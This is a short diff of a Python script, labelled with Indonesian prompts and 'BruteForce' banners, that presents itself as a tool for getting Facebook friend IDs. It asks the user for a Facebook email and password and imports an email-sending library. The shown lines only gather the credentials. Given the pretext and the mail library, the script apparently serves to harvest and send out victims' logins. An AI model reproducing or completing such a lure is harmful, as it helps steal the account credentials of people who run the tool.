@@ -1,11 +1,11 @@
-os,time
+import os,time
 import yagmail
 from termcolor import colored
 os.system('figlet EmEl')
 os.system('figlet BruteForce')
 os.system('figlet ^_^')
 print(colored('[ Trusted ID ]','yellow'))
-print(colored('[!]Login Di Perlukan Untuk Mendapatkan Id T>
+print(colored('[!]Login Di Perlukan Untuk Mendapatkan Id Teman','blue'))
 h = input(colored('Email/FB: ','red'))
 j = input(colored('Password: ','white'))
 
